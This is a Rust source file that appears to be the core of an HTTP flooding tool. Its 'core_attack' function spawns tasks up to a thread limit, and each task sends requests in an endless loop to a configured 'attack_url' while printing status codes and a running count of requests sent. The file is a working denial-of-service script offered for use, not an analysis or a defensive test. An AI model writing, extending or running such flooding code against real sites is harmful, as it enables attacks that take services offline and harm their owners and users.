use tokio::time::Instant;

use crate::extra_fn;
use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};

pub async fn start() {
    loop {
        core_attack();
    }
}

fn core_attack() {
    if let Ok(mut threads) = SAFE_PUB_VAR.lock() {
        if threads.thread_on + 1.0 < threads.threads_allowed {
            threads.thread_on += 1.0;
            unsafe {
                UNSAFE_PUB_VAR.threads_on += 1.0;
            }
            drop(threads);
            tokio::spawn(async {
                loop {
                    let now = Instant::now();
                    unsafe {
                        let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
                        match error_data.await {
                            Ok(status_code) => {
                                UNSAFE_PUB_VAR.amount_sent += 1.0;
                                println!(
                                    "Threads on {},\n Status code {},\n Time Passed for request {} sec,\n Request per 10 Millisecond {}",
                                    UNSAFE_PUB_VAR.threads_on,
                                    status_code.status(),
                                    now.elapsed().as_secs(),
                                    UNSAFE_PUB_VAR.amount_sent,
                                );
                            }
                            Err(data) => {
                                println!(
                                    "Threads on {}, Status ERROR {}\n Time: {}\n Request per 10 Millisecond {}",
                                    UNSAFE_PUB_VAR.threads_on,
                                    data,
                                    now.elapsed().as_secs(),
                                    UNSAFE_PUB_VAR.amount_sent
                                );
                            }
                        }
                    }
                }
            });
        } else {
            extra_fn::time_function();
        }
    }
}
